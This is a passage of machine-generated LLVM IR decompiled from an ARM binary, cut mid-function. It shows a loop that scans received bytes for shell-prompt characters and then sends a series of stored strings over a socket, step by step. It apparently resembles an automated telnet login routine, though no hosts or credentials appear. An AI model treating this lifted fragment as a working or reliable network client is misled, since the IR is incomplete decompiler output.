  %v5_10a78 = call i32 @send(i32 %v3_10a68, i32* %v4_10a78, i32 %v4_10a6c, i32 16384)
  store i32 %v5_10a78, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10a80 = load i32, i32* @r6, align 4
  %v1_10a80 = add i32 %v0_10a80, 4
  %v2_10a80 = inttoptr i32 %v1_10a80 to i32*
  %v3_10a80 = load i32, i32* %v2_10a80, align 4
  store i32 %v3_10a80, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_120c8.257 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10a8c = call i32 @send(i32 %v3_10a80, i32* bitcast ([3 x i8]* @global_var_120c8.257 to i32*), i32 2, i32 16384)
  store i32 %v5_10a8c, i32* %r0.global-to-local, align 4
  %v0_10a90 = load i32, i32* @r6, align 4
  %v1_10a90 = add i32 %v0_10a90, 24
  %v2_10a90 = inttoptr i32 %v1_10a90 to i32*
  %v3_10a90 = load i32, i32* %v2_10a90, align 4
  store i32 %v3_10a90, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_10a98 = add i32 %v0_10a90, 12
  %v3_10a98 = inttoptr i32 %v2_10a98 to i32*
  store i32 5, i32* %v3_10a98, align 4
  br label %dec_label_pc_10d00

dec_label_pc_10aa0:                               ; preds = %dec_label_pc_10844
  %v1_10aa0 = add i32 %v0_10844, 24
  %v2_10aa0 = inttoptr i32 %v1_10aa0 to i32*
  %v3_10aa0 = load i32, i32* %v2_10aa0, align 4
  store i32 %v3_10aa0, i32* %ip.global-to-local, align 4
  %v1_10aa4 = add i32 %v3_10aa0, -1
  store i32 %v1_10aa4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10aa8 = icmp eq i32 %v1_10aa4, 0
  store i1 %v2_10aa8, i1* %cpsr_z.global-to-local, align 1
  %v5_10aac = icmp sgt i32 %v1_10aa4, 0
  br i1 %v5_10aac, label %dec_label_pc_10ad4, label %dec_label_pc_107c8.backedge.thread

dec_label_pc_10ab4:                               ; preds = %bb357
  %v2_10ab4 = icmp ugt i8 %v3_10ad8, 35
  store i1 %v2_10ab4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ab4 = icmp eq i8 %v3_10ad8, 36
  store i1 %v7_10ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ab4, label %dec_label_pc_10ae8, label %dec_label_pc_10abc

dec_label_pc_10abc:                               ; preds = %dec_label_pc_10ab4
  %v2_10abc = icmp ugt i8 %v3_10ad8, 34
  store i1 %v2_10abc, i1* %cpsr_c.global-to-local, align 1
  %v7_10abc = icmp eq i8 %v3_10ad8, 35
  store i1 %v7_10abc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10abc, label %dec_label_pc_10ae8, label %dec_label_pc_10ac4

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_10abc
  %v2_10ac4 = icmp ugt i8 %v3_10ad8, 36
  store i1 %v2_10ac4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ac4 = icmp eq i8 %v3_10ad8, 37
  store i1 %v7_10ac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ac4, label %dec_label_pc_10ae8, label %dec_label_pc_10acc

dec_label_pc_10acc:                               ; preds = %dec_label_pc_10ac4
  %v1_10acc = add i32 %v0_10ae8, -1
  store i32 %v1_10acc, i32* %r0.global-to-local, align 4
  %v2_10acc = icmp ne i32 %v0_10ae8, 0
  store i1 %v2_10acc, i1* %cpsr_c.global-to-local, align 1
  %v7_10acc = icmp eq i32 %v0_10ae8, 1
  store i1 %v7_10acc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10acc, label %dec_label_pc_107c8.backedge.thread501, label %dec_label_pc_10ad4

dec_label_pc_10ad4:                               ; preds = %dec_label_pc_10aa0, %dec_label_pc_10acc
  %v0_10ae8 = phi i32 [ %v1_10acc, %dec_label_pc_10acc ], [ %v1_10aa4, %dec_label_pc_10aa0 ]
  %v2_10ad4 = add i32 %v0_10ae8, %v0_10844
  store i32 %v2_10ad4, i32* %r3.global-to-local, align 4
  %v1_10ad8 = add i32 %v2_10ad4, 28
  %v2_10ad8 = inttoptr i32 %v1_10ad8 to i8*
  %v3_10ad8 = load i8, i8* %v2_10ad8, align 1
  %v4_10ad8 = zext i8 %v3_10ad8 to i32
  store i32 %v4_10ad8, i32* %r3.global-to-local, align 4
  %v2_10adc = icmp ugt i8 %v3_10ad8, 61
  store i1 %v2_10adc, i1* %cpsr_c.global-to-local, align 1
  %v7_10adc = icmp eq i8 %v3_10ad8, 62
  store i1 %v7_10adc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10adc, label %dec_label_pc_10ae8, label %bb357

bb357:                                            ; preds = %dec_label_pc_10ad4
  %v3_10ae0 = icmp ugt i8 %v3_10ad8, 57
  store i1 %v3_10ae0, i1* %cpsr_c.global-to-local, align 1
  %v8_10ae0 = icmp eq i8 %v3_10ad8, 58
  store i1 %v8_10ae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10ae0, label %dec_label_pc_10ae8, label %dec_label_pc_10ab4

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_10ad4, %bb357, %dec_label_pc_10ac4, %dec_label_pc_10abc, %dec_label_pc_10ab4
  %v1_10ae8 = add i32 %v0_10ae8, 1
  store i32 %v1_10ae8, i32* @r7, align 4
  %v2_10aec = icmp eq i32 %v1_10ae8, -1
  store i1 %v2_10aec, i1* %cpsr_c.global-to-local, align 1
  %v7_10aec = icmp eq i32 %v0_10ae8, -2
  store i1 %v7_10aec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10aec, label %dec_label_pc_107c8.backedge.thread501, label %dec_label_pc_10af4

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10ae8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10af4 = icmp eq i32 %v1_10ae8, 0
  store i1 %v2_10af4, i1* %cpsr_z.global-to-local, align 1
  %tmp358 = icmp slt i32 %v1_10ae8, 1
  br i1 %tmp358, label %dec_label_pc_10950, label %dec_label_pc_10afc

dec_label_pc_10afc:                               ; preds = %dec_label_pc_10af4
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10b00 = call i32 @function_1134c(i32 5)
  store i32 %v2_10738, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_10b10 = call i32 @function_11268(i32 5, i32* nonnull %stack_var_-56)
  store i32 %v3_10b10, i32* %r0.global-to-local, align 4
  %v3_10b14 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10b14, i32* %r2.global-to-local, align 4
  store i32 %v3_10b10, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10b20 = load i32, i32* @r6, align 4
  %v1_10b20 = add i32 %v0_10b20, 4
  %v2_10b20 = inttoptr i32 %v1_10b20 to i32*
  %v3_10b20 = load i32, i32* %v2_10b20, align 4
  store i32 %v3_10b20, i32* %r0.global-to-local, align 4
  %v4_10b24 = inttoptr i32 %v3_10b10 to i32*
  %v5_10b24 = call i32 @send(i32 %v3_10b20, i32* %v4_10b24, i32 %v3_10b14, i32 16384)
  store i32 %v5_10b24, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_120c8.257 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10b34 = load i32, i32* @r6, align 4
  %v1_10b34 = add i32 %v0_10b34, 4
  %v2_10b34 = inttoptr i32 %v1_10b34 to i32*
  %v3_10b34 = load i32, i32* %v2_10b34, align 4
  store i32 %v3_10b34, i32* %r0.global-to-local, align 4
  %v5_10b38 = call i32 @send(i32 %v3_10b34, i32* bitcast ([3 x i8]* @global_var_120c8.257 to i32*), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10b40 = call i32 @function_11294(i32 5)
  store i32 %v1_10b40, i32* %r0.global-to-local, align 4
  %v0_10b44 = load i32, i32* @r6, align 4
  %v1_10b44 = add i32 %v0_10b44, 24
  %v2_10b44 = inttoptr i32 %v1_10b44 to i32*
  %v3_10b44 = load i32, i32* %v2_10b44, align 4
  store i32 %v3_10b44, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_10b4c = add i32 %v0_10b44, 12
  %v3_10b4c = inttoptr i32 %v2_10b4c to i32*
  store i32 6, i32* %v3_10b4c, align 4
  br label %dec_label_pc_10d00

dec_label_pc_10bc8:                               ; preds = %dec_label_pc_10844
  %v1_10bc8 = add i32 %v0_10844, 24
  %v2_10bc8 = inttoptr i32 %v1_10bc8 to i32*
  %v3_10bc8 = load i32, i32* %v2_10bc8, align 4
  store i32 %v3_10bc8, i32* %ip.global-to-local, align 4
  %v1_10bcc = add i32 %v3_10bc8, -1
  store i32 %v1_10bcc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10bd0 = icmp eq i32 %v1_10bcc, 0
  store i1 %v2_10bd0, i1* %cpsr_z.global-to-local, align 1
  %v5_10bd4 = icmp sgt i32 %v1_10bcc, 0
  br i1 %v5_10bd4, label %dec_label_pc_10bfc, label %dec_label_pc_107c8.backedge.thread

dec_label_pc_10bdc:                               ; preds = %bb359
  %v2_10bdc = icmp ugt i8 %v3_10c00, 35
  store i1 %v2_10bdc, i1* %cpsr_c.global-to-local, align 1
  %v7_10bdc = icmp eq i8 %v3_10c00, 36
  store i1 %v7_10bdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10bdc, label %dec_label_pc_10c10, label %dec_label_pc_10be4

dec_label_pc_10be4:                               ; preds = %dec_label_pc_10bdc
  %v2_10be4 = icmp ugt i8 %v3_10c00, 34
  store i1 %v2_10be4, i1* %cpsr_c.global-to-local, align 1
  %v7_10be4 = icmp eq i8 %v3_10c00, 35
  store i1 %v7_10be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10be4, label %dec_label_pc_10c10, label %dec_label_pc_10bec

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10be4
  %v2_10bec = icmp ugt i8 %v3_10c00, 36
  store i1 %v2_10bec, i1* %cpsr_c.global-to-local, align 1
  %v7_10bec = icmp eq i8 %v3_10c00, 37
  store i1 %v7_10bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10bec, label %dec_label_pc_10c10, label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10bec
  %v1_10bf4 = add i32 %v0_10c10, -1
  store i32 %v1_10bf4, i32* %r0.global-to-local, align 4
  %v2_10bf4 = icmp ne i32 %v0_10c10, 0
  store i1 %v2_10bf4, i1* %cpsr_c.global-to-local, align 1
  %v7_10bf4 = icmp eq i32 %v0_10c10, 1
  store i1 %v7_10bf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10bf4, label %dec_label_pc_107c8.backedge.thread501, label %dec_label_pc_10bfc

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10bc8, %dec_label_pc_10bf4
  %v0_10c10 = phi i32 [ %v1_10bf4, %dec_label_pc_10bf4 ], [ %v1_10bcc, %dec_label_pc_10bc8 ]
  %v2_10bfc = add i32 %v0_10c10, %v0_10844
  store i32 %v2_10bfc, i32* %r3.global-to-local, align 4
  %v1_10c00 = add i32 %v2_10bfc, 28
  %v2_10c00 = inttoptr i32 %v1_10c00 to i8*
  %v3_10c00 = load i8, i8* %v2_10c00, align 1
  %v4_10c00 = zext i8 %v3_10c00 to i32
  store i32 %v4_10c00, i32* %r3.global-to-local, align 4
  %v2_10c04 = icmp ugt i8 %v3_10c00, 61
  store i1 %v2_10c04, i1* %cpsr_c.global-to-local, align 1
  %v7_10c04 = icmp eq i8 %v3_10c00, 62
  store i1 %v7_10c04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c04, label %dec_label_pc_10c10, label %bb359

bb359:                                            ; preds = %dec_label_pc_10bfc
  %v3_10c08 = icmp ugt i8 %v3_10c00, 57
  store i1 %v3_10c08, i1* %cpsr_c.global-to-local, align 1
  %v8_10c08 = icmp eq i8 %v3_10c00, 58
  store i1 %v8_10c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10c08, label %dec_label_pc_10c10, label %dec_label_pc_10bdc

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10bfc, %bb359, %dec_label_pc_10bec, %dec_label_pc_10be4, %dec_label_pc_10bdc
  %v1_10c10 = add i32 %v0_10c10, 1
  store i32 %v1_10c10, i32* @r7, align 4
  %v2_10c14 = icmp eq i32 %v1_10c10, -1
  store i1 %v2_10c14, i1* %cpsr_c.global-to-local, align 1
  %v7_10c14 = icmp eq i32 %v0_10c10, -2
  store i1 %v7_10c14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c14, label %dec_label_pc_107c8.backedge.thread501, label %dec_label_pc_10c1c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10c10
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c1c = icmp eq i32 %v1_10c10, 0
  store i1 %v2_10c1c, i1* %cpsr_z.global-to-local, align 1
  %tmp360 = icmp slt i32 %v1_10c10, 1
  br i1 %tmp360, label %dec_label_pc_10950, label %dec_label_pc_10c24

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10c1c
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_10c28 = call i32 @function_1134c(i32 6)
  store i32 %v2_10c30, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_10c38 = call i32 @function_11268(i32 6, i32* nonnull %stack_var_-48)
  store i32 %v3_10c38, i32* %r0.global-to-local, align 4
  %v3_10c3c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10c3c, i32* %r2.global-to-local, align 4
  store i32 %v3_10c38, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10c48 = load i32, i32* @r6, align 4
  %v1_10c48 = add i32 %v0_10c48, 4
  %v2_10c48 = inttoptr i32 %v1_10c48 to i32*
  %v3_10c48 = load i32, i32* %v2_10c48, align 4
  store i32 %v3_10c48, i32* %r0.global-to-local, align 4
  %v4_10c4c = inttoptr i32 %v3_10c38 to i32*
  %v5_10c4c = call i32 @send(i32 %v3_10c48, i32* %v4_10c4c, i32 %v3_10c3c, i32 16384)
  store i32 %v5_10c4c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_120c8.257 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10c5c = load i32, i32* @r6, align 4
  %v1_10c5c = add i32 %v0_10c5c, 4
  %v2_10c5c = inttoptr i32 %v1_10c5c to i32*
  %v3_10c5c = load i32, i32* %v2_10c5c, align 4
  store i32 %v3_10c5c, i32* %r0.global-to-local, align 4
  %v5_10c60 = call i32 @send(i32 %v3_10c5c, i32* bitcast ([3 x i8]* @global_var_120c8.257 to i32*), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_10c68 = call i32 @function_11294(i32 6)
  store i32 %v1_10c68, i32* %r0.global-to-local, align 4
  %v0_10c6c = load i32, i32* @r6, align 4
  %v1_10c6c = add i32 %v0_10c6c, 24
  %v2_10c6c = inttoptr i32 %v1_10c6c to i32*
  %v3_10c6c = load i32, i32* %v2_10c6c, align 4
  store i32 %v3_10c6c, i32* %ip.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v2_10c74 = add i32 %v0_10c6c, 12
  %v3_10c74 = inttoptr i32 %v2_10c74 to i32*
  store i32 7, i32* %v3_10c74, align 4
  br label %dec_label_pc_10d00

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10844
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10c80 = call i32 @function_1134c(i32 10)
  store i32 %v2_10738, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_10c90 = call i32 @function_11268(i32 10, i32* nonnull %stack_var_-56)
  %v3_10c94 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10c90, i32* %r2.global-to-local, align 4
  %v1_10c9c = add i32 %v3_10c94, -1
  store i32 %v1_10c9c, i32* %r3.global-to-local, align 4
  %v0_10ca0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10ca0, i32* %r0.global-to-local, align 4
  %v0_10ca4 = load i32, i32* @r6, align 4
  %v1_10ca4 = add i32 %v0_10ca4, 24
  %v2_10ca4 = inttoptr i32 %v1_10ca4 to i32*
  %v3_10ca4 = load i32, i32* %v2_10ca4, align 4
  store i32 %v3_10ca4, i32* %r1.global-to-local, align 4
  %v4_10ca8 = call i32 @function_1185c(i32 %v0_10ca0, i32 %v3_10ca4, i32 %v3_10c90, i32 %v1_10c9c)
  %v2_10cac = icmp eq i32 %v4_10ca8, -1
  store i1 %v2_10cac, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_10cac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_10ca8, i32* @r4, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_11000 = call i32 @function_11294(i32 10)
  br i1 %v2_10cac, label %dec_label_pc_10ffc, label %dec_label_pc_10cb8

dec_label_pc_10cb8:                               ; preds = %dec_label_pc_10c7c
  store i32 %v1_11000, i32* %r0.global-to-local, align 4
  %v0_10cc0 = load i32, i32* @r6, align 4
  %v1_10cc0 = add i32 %v0_10cc0, 4
  %v2_10cc0 = inttoptr i32 %v1_10cc0 to i32*
  %v3_10cc0 = load i32, i32* %v2_10cc0, align 4
  store i32 %v3_10cc0, i32* %r0.global-to-local, align 4
  %v1_10cc4 = call i32 @close(i32 %v3_10cc0)
  store i32 %v1_10cc4, i32* %r0.global-to-local, align 4
  %v0_10cc8 = load i32, i32* @r6, align 4
  %v1_10cc8 = add i32 %v0_10cc8, 284
  %v2_10cc8 = inttoptr i32 %v1_10cc8 to i8*
  %v3_10cc8 = load i8, i8* %v2_10cc8, align 1
  %v4_10cc8 = zext i8 %v3_10cc8 to i32
  %v1_10ccc = add nuw nsw i32 %v4_10cc8, 1
  %v1_10cd0 = urem i32 %v1_10ccc, 256
  store i32 %v1_10cd0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  %v2_10cd8 = icmp ugt i32 %v1_10cd0, 9
  store i1 %v2_10cd8, i1* %cpsr_c.global-to-local, align 1
  %v7_10cd8 = icmp eq i32 %v1_10cd0, 10
  store i1 %v7_10cd8, i1* %cpsr_z.global-to-local, align 1
  %v2_10cdc = add i32 %v0_10cc8, 4
  %v3_10cdc = inttoptr i32 %v2_10cdc to i32*
  store i32 -1, i32* %v3_10cdc, align 4
  %v0_10ce0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10ce0 = trunc i32 %v0_10ce0 to i8
  %v2_10ce0 = load i32, i32* @r6, align 4
  %v3_10ce0 = add i32 %v2_10ce0, 284
  %v4_10ce0 = inttoptr i32 %v3_10ce0 to i8*
  store i8 %v1_10ce0, i8* %v4_10ce0, align 1
  %v0_10ce4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10ce4, label %dec_label_pc_10ce8, label %dec_label_pc_1115c

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10cb8
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10cf0 = load i32, i32* @r6, align 4
  %v1_10cf0 = add i32 %v0_10cf0, 24
  %v2_10cf0 = inttoptr i32 %v1_10cf0 to i32*
  %v3_10cf0 = load i32, i32* %v2_10cf0, align 4
  store i32 %v3_10cf0, i32* %ip.global-to-local, align 4
  %v3_10cf4 = add i32 %v0_10cf0, 284
  %v4_10cf4 = inttoptr i32 %v3_10cf4 to i8*
  store i8 0, i8* %v4_10cf4, align 1
  %v0_10cf8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10cf8 = load i32, i32* @r6, align 4
  %v2_10cf8 = add i32 %v1_10cf8, 12
  %v3_10cf8 = inttoptr i32 %v2_10cf8 to i32*
  store i32 %v0_10cf8, i32* %v3_10cf8, align 4
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %.thread236, %dec_label_pc_10ee8, %dec_label_pc_10e34, %dec_label_pc_10d80, %dec_label_pc_1115c, %dec_label_pc_11098, %dec_label_pc_10c24, %dec_label_pc_10afc, %dec_label_pc_10a64, %dec_label_pc_109cc, %dec_label_pc_10958, %dec_label_pc_10ce8
  %v0_10d00 = load i32, i32* %ip.global-to-local, align 4
  %v1_10d00 = load i32, i32* @r7, align 4
  %v2_10d00 = sub i32 %v0_10d00, %v1_10d00
  %v3_10d00 = icmp uge i32 %v0_10d00, %v1_10d00
  store i1 %v3_10d00, i1* %cpsr_c.global-to-local, align 1
  %v4_10d00 = xor i32 %v1_10d00, %v0_10d00
  %v5_10d00 = xor i32 %v2_10d00, %v0_10d00
  %v6_10d00 = and i32 %v5_10d00, %v4_10d00
  %v7_10d00 = icmp slt i32 %v6_10d00, 0
  %v8_10d00 = icmp slt i32 %v2_10d00, 0
  %v9_10d00 = icmp eq i32 %v0_10d00, %v1_10d00
  store i1 %v9_10d00, i1* %cpsr_z.global-to-local, align 1
  %v2_10d04 = xor i1 %v8_10d00, %v7_10d00
  %v0_10d00.v1_10d00 = select i1 %v2_10d04, i32 %v0_10d00, i32 %v1_10d00
  store i32 %v0_10d00.v1_10d00, i32* %r1.global-to-local, align 4
  %v2_10d0c = sub i32 %v0_10d00, %v0_10d00.v1_10d00
  store i32 %v2_10d0c, i32* %r2.global-to-local, align 4
  %v1_10d10 = load i32, i32* @r6, align 4
  %v2_10d10 = add i32 %v1_10d10, 24
  %v3_10d10 = inttoptr i32 %v2_10d10 to i32*
  store i32 %v2_10d0c, i32* %v3_10d10, align 4
  %v0_10d14 = load i32, i32* %r8.global-to-local, align 4
  %v1_10d14 = load i32, i32* %r1.global-to-local, align 4
  %v2_10d14 = add i32 %v1_10d14, %v0_10d14
  store i32 %v2_10d14, i32* %r1.global-to-local, align 4
  store i32 %v0_10d14, i32* %r0.global-to-local, align 4
  %v3_10d1c = inttoptr i32 %v0_10d14 to i32*
  %v4_10d1c = inttoptr i32 %v2_10d14 to i32*
  %v5_10d1c = call i32* @memmove(i32* %v3_10d1c, i32* %v4_10d1c, i32 %v2_10d0c)
  %v7_10d1c = ptrtoint i32* %v5_10d1c to i32
  store i32 %v7_10d1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10844

dec_label_pc_10d24:                               ; preds = %dec_label_pc_10844
  %v1_10d24 = add i32 %v0_10844, 24
  %v2_10d24 = inttoptr i32 %v1_10d24 to i32*
  %v3_10d24 = load i32, i32* %v2_10d24, align 4
  store i32 %v3_10d24, i32* %ip.global-to-local, align 4
  %v1_10d28 = add i32 %v3_10d24, -1
  store i32 %v1_10d28, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d2c = icmp eq i32 %v1_10d28, 0
  store i1 %v2_10d2c, i1* %cpsr_z.global-to-local, align 1
  %v5_10d30 = icmp sgt i32 %v1_10d28, 0
  br i1 %v5_10d30, label %dec_label_pc_10d58, label %dec_label_pc_107c8.backedge.thread

dec_label_pc_10d38:                               ; preds = %bb363
  %v2_10d38 = icmp ugt i8 %v3_10d5c, 35
  store i1 %v2_10d38, i1* %cpsr_c.global-to-local, align 1
  %v7_10d38 = icmp eq i8 %v3_10d5c, 36
  store i1 %v7_10d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d38, label %dec_label_pc_10d6c, label %dec_label_pc_10d40

dec_label_pc_10d40:                               ; preds = %dec_label_pc_10d38
  %v2_10d40 = icmp ugt i8 %v3_10d5c, 34
  store i1 %v2_10d40, i1* %cpsr_c.global-to-local, align 1
  %v7_10d40 = icmp eq i8 %v3_10d5c, 35
  store i1 %v7_10d40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d40, label %dec_label_pc_10d6c, label %dec_label_pc_10d48

dec_label_pc_10d48:                               ; preds = %dec_label_pc_10d40
  %v2_10d48 = icmp ugt i8 %v3_10d5c, 36
  store i1 %v2_10d48, i1* %cpsr_c.global-to-local, align 1
  %v7_10d48 = icmp eq i8 %v3_10d5c, 37
  store i1 %v7_10d48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d48, label %dec_label_pc_10d6c, label %dec_label_pc_10d50

dec_label_pc_10d50:                               ; preds = %dec_label_pc_10d48
  %v1_10d50 = add i32 %v0_10d6c, -1
  store i32 %v1_10d50, i32* %r0.global-to-local, align 4
  %v2_10d50 = icmp ne i32 %v0_10d6c, 0
  store i1 %v2_10d50, i1* %cpsr_c.global-to-local, align 1
  %v7_10d50 = icmp eq i32 %v0_10d6c, 1
  store i1 %v7_10d50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d50, label %dec_label_pc_107c8.backedge.thread501, label %dec_label_pc_10d58

dec_label_pc_10d58:                               ; preds = %dec_label_pc_10d24, %dec_label_pc_10d50
  %v0_10d6c = phi i32 [ %v1_10d50, %dec_label_pc_10d50 ], [ %v1_10d28, %dec_label_pc_10d24 ]
  %v2_10d58 = add i32 %v0_10d6c, %v0_10844
  store i32 %v2_10d58, i32* %r3.global-to-local, align 4
  %v1_10d5c = add i32 %v2_10d58, 28
  %v2_10d5c = inttoptr i32 %v1_10d5c to i8*
  %v3_10d5c = load i8, i8* %v2_10d5c, align 1
  %v4_10d5c = zext i8 %v3_10d5c to i32
  store i32 %v4_10d5c, i32* %r3.global-to-local, align 4
  %v2_10d60 = icmp ugt i8 %v3_10d5c, 61
  store i1 %v2_10d60, i1* %cpsr_c.global-to-local, align 1
  %v7_10d60 = icmp eq i8 %v3_10d5c, 62
  store i1 %v7_10d60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d60, label %dec_label_pc_10d6c, label %bb363

bb363:                                            ; preds = %dec_label_pc_10d58
  %v3_10d64 = icmp ugt i8 %v3_10d5c, 57
  store i1 %v3_10d64, i1* %cpsr_c.global-to-local, align 1
  %v8_10d64 = icmp eq i8 %v3_10d5c, 58
  store i1 %v8_10d64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10d64, label %dec_label_pc_10d6c, label %dec_label_pc_10d38

dec_label_pc_10d6c:                               ; preds = %dec_label_pc_10d58, %bb363, %dec_label_pc_10d48, %dec_label_pc_10d40, %dec_label_pc_10d38
  %v1_10d6c = add i32 %v0_10d6c, 1
  store i32 %v1_10d6c, i32* @r7, align 4
  %v2_10d70 = icmp eq i32 %v1_10d6c, -1
  store i1 %v2_10d70, i1* %cpsr_c.global-to-local, align 1
  %v7_10d70 = icmp eq i32 %v0_10d6c, -2
  store i1 %v7_10d70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d70, label %dec_label_pc_107c8.backedge.thread501, label %dec_label_pc_10d78

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d6c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d78 = icmp eq i32 %v1_10d6c, 0
  store i1 %v2_10d78, i1* %cpsr_z.global-to-local, align 1
  %tmp364 = icmp slt i32 %v1_10d6c, 1
  br i1 %tmp364, label %dec_label_pc_10950, label %dec_label_pc_10d80

dec_label_pc_10d80:                               ; preds = %dec_label_pc_10d78
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_10d84 = call i32 @function_1134c(i32 7)
  store i32 %v2_10738, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_10d94 = call i32 @function_11268(i32 7, i32* nonnull %stack_var_-56)
  store i32 %v3_10d94, i32* %r0.global-to-local, align 4
  %v3_10d98 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10d98, i32* %r2.global-to-local, align 4
  store i32 %v3_10d94, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10da4 = load i32, i32* @r6, align 4
  %v1_10da4 = add i32 %v0_10da4, 4
  %v2_10da4 = inttoptr i32 %v1_10da4 to i32*
  %v3_10da4 = load i32, i32* %v2_10da4, align 4
  store i32 %v3_10da4, i32* %r0.global-to-local, align 4
  %v4_10da8 = inttoptr i32 %v3_10d94 to i32*
  %v5_10da8 = call i32 @send(i32 %v3_10da4, i32* %v4_10da8, i32 %v3_10d98, i32 16384)
  store i32 %v5_10da8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_120c8.257 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10db8 = load i32, i32* @r6, align 4
  %v1_10db8 = add i32 %v0_10db8, 4
  %v2_10db8 = inttoptr i32 %v1_10db8 to i32*
  %v3_10db8 = load i32, i32* %v2_10db8, align 4
  store i32 %v3_10db8, i32* %r0.global-to-local, align 4
  %v5_10dbc = call i32 @send(i32 %v3_10db8, i32* bitcast ([3 x i8]* @global_var_120c8.257 to i32*), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_10dc4 = call i32 @function_11294(i32 7)
  store i32 %v1_10dc4, i32* %r0.global-to-local, align 4
  %v0_10dc8 = load i32, i32* @r6, align 4
  %v1_10dc8 = add i32 %v0_10dc8, 24
  %v2_10dc8 = inttoptr i32 %v1_10dc8 to i32*
